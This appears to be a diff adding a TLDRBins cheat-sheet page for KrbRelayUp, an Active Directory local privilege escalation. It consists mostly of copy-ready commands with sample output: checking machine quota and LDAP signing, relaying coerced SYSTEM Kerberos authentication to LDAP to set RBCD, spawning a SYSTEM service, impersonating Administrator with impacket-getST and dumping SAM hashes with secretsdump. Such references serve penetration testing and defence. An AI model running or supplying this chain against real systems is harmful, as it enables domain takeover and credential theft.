@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<meta name="description" content="">
+<title>KrbRelayUp | TLDRBins</title>
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+</head>
+<body>
+<header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/krbrelayup/"><span>KrbRelayUp</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+    </div>
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
+
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
+
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
+
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
+
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
+
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
+
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
+
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
+
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
+
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
+
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
+
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
+
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
+
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
+
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
+  <p class="desc"></p>
+</header>
+<main>
+<ul class="tagsList single">
+  <li><a href="https://tldrbins.github.io/@krbrelayup/">KrbRelayUp</a></li>
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  <li><a href="https://tldrbins.github.io/@local-privilege-escalation/">Local Privilege Escalation</a></li>
+  <li><a href="https://tldrbins.github.io/@kerberos-relay/">Kerberos Relay</a></li>
+  <li><a href="https://tldrbins.github.io/@ldap-signing/">LDAP Signing</a></li>
+  <li><a href="https://tldrbins.github.io/@shadow-credentials/">Shadow Credentials</a></li>
+  <li><a href="https://tldrbins.github.io/@adcs-web-enrollment/">ADCS Web Enrollment</a></li>
+  <li><a href="https://tldrbins.github.io/@rbcd/">RBCD</a></li>
+  <li><a href="https://tldrbins.github.io/@s4u2self/">S4U2Self</a></li>
+  <li><a href="https://tldrbins.github.io/@scmuacbypass/">SCMUACBypass</a></li>
+</ul>
+<hr>
+<div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click on a keyword to enable inline editing.</li>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
+  <div id="dynamicFormContainer">
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CLSID">CLSID: </label><input type="text" name="CLSID"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="NEW_COMPUTER">NEW COMPUTER: </label><input type="text" name="NEW_COMPUTER"></div><div class="input-group"><label for="NEW_PASSWORD">NEW PASSWORD: </label><input type="text" name="NEW_PASSWORD"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<div class="buttons center">
+		<button id="form_btn">Show Inspector</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
+  <h3 id="prerequisite">Prerequisite</h3>
+<h4 id="1-machine-quota">1. Machine Quota</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M maq
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap DC01.example.com -u <span class="s1">'apple.seed'</span> -p <span class="s1">'Password'</span> -d example.com -M maq
+</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password 
+</span></span></span><span class="line"><span class="cl"><span class="go">MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+</span></span></span><span class="line"><span class="cl"><span class="go">MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+</span></span></span></div></pre></div><h4 id="2-ldap-signing-not-enforced">2. LDAP Signing NOT Enforced</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M ldap-checker
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap DC01.example.com -u <span class="s1">'apple.seed'</span> -p <span class="s1">'Password'</span> -d example.com -M ldap-checker
+</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password 
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP-CHE... 10.10.72.181    389    DC01          LDAP signing NOT enforced
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP-CHE... 10.10.72.181    389    DC01          LDAPS channel binding is set to: Never
+</span></span></span></div></pre></div><hr>
+<h3 id="abuse-1-create-control-primitive-over-local-machine-using-rbcd">Abuse #1: Create Control Primitive over Local Machine using RBCD</h3>
+<p class="tabs">
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-coerce-kerberos-auth-from-local-machine-account-relay-it-to-ldap">1. Coerce Kerberos Auth from Local Machine Account, Relay it to LDAP</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\KrbRelayUp.exe relay -Domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -CreateNewComputerAccount -ComputerName <span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>$ -ComputerPassword <span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span> --clsid <span class="o editable-keyword">&lt;CLSID&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\ProgramData&gt; .\KrbRelayUp.exe relay -Domain example.com -CreateNewComputerAccount -ComputerName Test$ -ComputerPassword Test1234 --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3
+</span></span></span><span class="line"><span class="cl"><span class="go">.\KrbRelayUp.exe relay -Domain example.com -CreateNewComputerAccount -ComputerName Test$ -ComputerPassword Test1234 --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3
+</span></span></span><span class="line"><span class="cl"><span class="go">KrbRelayUp - Relaying you to SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Rewriting function table
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Rewriting PEB
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Init COM server
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Computer account "Test$" added with password "Test1234"
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Looking for available ports..
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Port 10246 available
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Register COM server
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Forcing SYSTEM authentication
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] LDAP session established
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] RBCD rights added successfully
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Run the spawn method for SYSTEM shell:
+</span></span></span><span class="line"><span class="cl"><span class="go">    ./KrbRelayUp.exe spawn -m rbcd -d example.com -dc dc01.example.com -cn Test$ -cp Test1234
+</span></span></span></div></pre></div><h4 id="2-obtain-a-kerberos-service-ticket-and-use-it-to-create-a-new-service-running-as-system">2. Obtain a Kerberos Service Ticket and Use it to Create a New Service Running as SYSTEM</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\KrbRelayUp.exe spawn -m rbcd -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc <span class="o editable-keyword">&lt;DC&gt;</span> -cn <span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>$ -cp <span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\ProgramData&gt; .\KrbRelayUp.exe spawn -m rbcd -d example.com -dc dc01.example.com -cn Test$ -cp Test1234
+</span></span></span><span class="line"><span class="cl"><span class="go">.\KrbRelayUp.exe spawn -m rbcd -d example.com -dc dc01.example.com -cn Test$ -cp Test1234
+</span></span></span><span class="line"><span class="cl"><span class="go">KrbRelayUp - Relaying you to SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Building S4U2self 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Using domain controller: dc01.example.com (fe80::988d:722f:af5:6fb9%6)
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Sending S4U2self request to fe80::988d:722f:af5:6fb9%6:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2self success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Got a TGS for 'Administrator' to 'Test$@EXAMPLE.COM'
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Impersonating user 'Administrator' to target SPN 'HOST/DC01'
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Building S4U2proxy request for service: 'HOST/DC01'
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Using domain controller: dc01.example.com (fe80::988d:722f:af5:6fb9%6)
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Sending S4U2proxy request to domain controller fe80::988d:722f:af5:6fb9%6:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2proxy success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Using ticket to connect to Service Manger
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] AcquireCredentialsHandleHook called for package N
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Changing to Kerberos package
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] InitializeSecurityContextHook called for target H
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] InitializeSecurityContext status = 0x00090312
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] InitializeSecurityContextHook called for target H
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] InitializeSecurityContext status = 0x00000000
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] KrbSCM Service created
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] KrbSCM Service started
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Clean-up done
+</span></span></span></div></pre></div><h4 id="3-request-a-service-ticket">3. Request a Service Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn cifs/<span class="o editable-keyword">&lt;DC&gt;</span> -impersonate Administrator -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>$:<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'   
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-getST -spn cifs/dc01.example.com -impersonate Administrator -dc-ip 10.10.72.181 example.com/<span class="s1">'Test$'</span>:<span class="s1">'Test1234'</span>   
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting TGT for user
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Impersonating Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in Administrator@cifs_dc01.example.com@EXAMPLE.COM.ccache
+</span></span></span></div></pre></div><h4 id="4-secrets-dump">4. Secrets Dump</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import ticket
+</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME='Administrator@cifs_<span class="o editable-keyword">&lt;DC&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>.ccache'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">export KRB5CCNAME='Administrator@cifs_dc01.example.com@EXAMPLE.COM.ccache'
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> klist
+</span></span><span class="line"><span class="cl"><span class="go">Ticket cache: FILE:Administrator@cifs_dc01.example.com@EXAMPLE.COM.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">Default principal: Administrator@example.com
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Valid starting       Expires              Service principal
+</span></span></span><span class="line"><span class="cl"><span class="go">2025-08-04T16:20:45  2025-08-05T02:20:44  cifs/dc01.example.com@EXAMPLE.COM
+</span></span></span><span class="line"><span class="cl"><span class="go">        renew until 2025-08-05T16:20:44
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Secrets dump
+</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump -k -no-pass <span class="o editable-keyword">&lt;DC&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -k -no-pass DC01.example.com                                                                   
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Service RemoteRegistry is in stopped state
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting service RemoteRegistry
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
+</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
+</span></span></span><span class="line"><span class="cl"><span class="go">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
+</span></span></span></div></pre></div></div></div><p></p>
+
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
+</footer>
+
+
+</body></html>
